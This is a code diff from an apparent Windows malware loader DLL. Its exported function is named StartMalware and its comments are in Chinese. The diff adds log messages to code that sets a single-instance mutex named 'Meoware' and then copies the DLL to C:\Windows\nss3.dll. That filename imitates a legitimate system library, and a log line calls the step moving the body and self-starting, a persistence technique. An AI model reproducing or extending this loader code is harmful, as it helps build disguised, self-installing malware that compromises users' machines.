@@ -16,6 +16,7 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
         return;
     }
 
+    Log("log.txt", "[+] loader: 建立 Mutex.\n");
     // 1. 宣告互斥體控制代碼
     HANDLE hMutex = NULL;
     const char* mutexName = "Meoware"; // 2. 設定唯一的互斥體名稱
@@ -29,13 +30,15 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
 
     // 3. 檢查互斥體是否已存在
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        CloseHandle(hMutex); // 避免資源洩漏
+        CloseHandle(hMutex);
+        Log("log.txt", "[+] loader: 程式已經在執行了.\n");
         return;
     }
 
     std::string path = GetCurrentDllPath();
     std::string target_path = "C:\\Windows\\nss3.dll";
 
+    Log("log.txt", "[+] loader: 移動本體以及自我啟動.\n");
     if (!CopyFile(toUTF16(path).c_str(), toUTF16(target_path).c_str(), FALSE))
     {
         Log("log.txt", "[+] loader: self copy failed.\n");
